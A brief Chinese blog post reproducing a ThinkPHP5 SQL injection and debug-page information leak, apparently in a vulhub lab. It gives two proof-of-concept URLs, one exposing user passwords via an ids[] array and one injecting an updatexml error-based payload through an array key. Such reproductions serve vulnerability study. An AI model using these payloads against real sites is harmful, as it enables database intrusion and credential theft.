---
title: ThinkPHP5 SQL注入漏洞 && 敏感信息泄露
date: 2020-06-14 14:03:28
categories: 漏洞复现
tags: ThinkPHP
---

#### 复现过程

1.访问如下POC，可看到用户密码

```
http://your-ip/index.php?ids[]=1&ids[]=2
```

<!--more-->

![](http://qn.laohuan.xin/2020-06-14_14-07-36.png)

2.DEBUG页面泄露敏感信息

```
http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
```

![](http://qn.laohuan.xin/2020-06-14_14-08-36.png)

#### 参考链接

<http://github.com/vulhub/vulhub/blob/master/thinkphp/in-sqlinjection/README.zh-cn.md/>